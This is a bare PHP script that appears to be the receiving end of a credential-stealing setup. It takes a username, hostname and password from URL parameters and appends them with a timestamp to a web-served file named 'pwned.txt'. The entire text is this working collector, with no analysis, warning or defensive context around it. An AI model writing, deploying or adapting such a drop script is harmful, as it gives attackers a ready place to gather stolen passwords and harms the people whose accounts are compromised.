<?
$username = isset($_GET['username']) ? $_GET['username'] : '';
$hostname = isset($_GET['hostname']) ? $_GET['hostname'] : '';
$pwd = isset($_GET['pwd']) ? $_GET['pwd'] : '';
if ($username && $hostname && $pwd) {
    $file = '/var/www/html/pwned.txt';
    $newline = time() . ": " . $username . "@" . $hostname . ":" . $pwd;
    file_put_contents($file, $newline.PHP_EOL , FILE_APPEND | LOCK_EX);
}
